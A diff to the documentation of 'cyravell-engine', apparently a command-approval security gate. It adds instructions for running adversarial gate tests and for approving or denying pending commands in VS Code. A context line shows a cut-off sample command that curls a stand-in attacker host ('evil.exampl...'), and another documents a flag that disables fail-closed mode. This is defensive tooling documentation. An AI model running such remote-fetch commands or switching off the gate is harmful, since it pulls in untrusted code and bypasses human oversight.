@@ -234,3 +234,39 @@ cargo run --bin cyravell-engine -- exec --command "curl -sSL https://evil.exampl
 - Gated commands are prevented from dispatching, protecting the system against unmonitored execution.
 - To bypass fail-closed in standalone emergency scenarios, specify `--fail-closed false`.
 
+---
+
+## 9. Adversarial Security Validation & Gate Hardening (Phase 2.4)
+
+### 9.1 Running Adversarial Security Tests
+Phase 2.4 introduces a hardened, race-safe execution gate with single-use cryptographic authorization tokens, strict parameter binding, and an adversarial test suite:
+
+```bash
+# Run all adversarial tests in the gate module
+cargo test --lib gate::adversarial -- --nocapture
+
+# Run the complete test pipeline including adversarial tests
+./scripts/test.sh
+```
+
+### 9.2 Running Adversarial IPC Validation
+To test adversarial gate resistance across the live IPC socket interface:
+
+```bash
+cargo run --bin cyravell-test-harness -- test-adversarial-gate
+```
+
+This verifies resistance against:
+1. **Approval Bypass Attempts (Category A):** Fabricated tokens, missing tokens, expired tokens, session tampering, and command tampering (TOCTOU).
+2. **Replay & Duplicate Requests (Category B):** Token reuse prevention, duplicate decide rejection, and serial dispatch deduplication.
+3. **Race Conditions & Concurrency (Category C):** Multi-threaded races (Approve vs Deny, Approve vs Cancel, 8 concurrent threads racing for 1 token).
+4. **Failure & Recovery (Category D):** Token invalidation on engine restart, failed backend execution handling, and fail-closed offline enforcement.
+5. **Boundary & Input Validation (Category E):** Null bytes in commands/IDs, oversized commands (>64KB), and empty commands.
+
+### 9.3 Reviewing Pending Approvals in VS Code
+1. Open the VS Code Command Palette (`Ctrl+Shift+P` / `Cmd+Shift+P`).
+2. Run `Cyravell: Review Pending Command Approvals`.
+3. If commands are pending approval, a QuickPick list opens displaying the command, severity, and matched security rule.
+4. Select a command and choose **Approve**, **Deny**, or **Cancel**.
+5. Once decided, the single-use authorization token is handled securely by the engine, and the decision is permanently recorded in the cryptographic audit log.
+
